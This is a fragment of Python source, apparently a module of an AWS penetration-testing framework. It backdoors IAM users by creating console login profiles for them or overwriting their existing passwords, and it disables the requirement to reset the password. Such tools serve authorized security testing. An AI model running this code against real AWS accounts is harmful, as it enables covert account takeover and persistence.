...
parser.add_argument(
    ...
    required=False,
    default=None,
    help="A comma-separated list of usernames of users in the AWS account to backdoor. If not supplied, it defaults to every user in the account",
)
parser.add_argument(
    "--update",
    required=False,
    default=False,
    action="store_true",
    help="Try to update login profiles instead of creating a new one. This can be used to change other users passwords who already have a login profile.",
)
...
def main(args, pacu_main):
    ...
    for user in users:
        ...
        password = create_valid_password(password_policy)
        try:
            caller(UserName=user, Password=password, PasswordResetRequired=False)
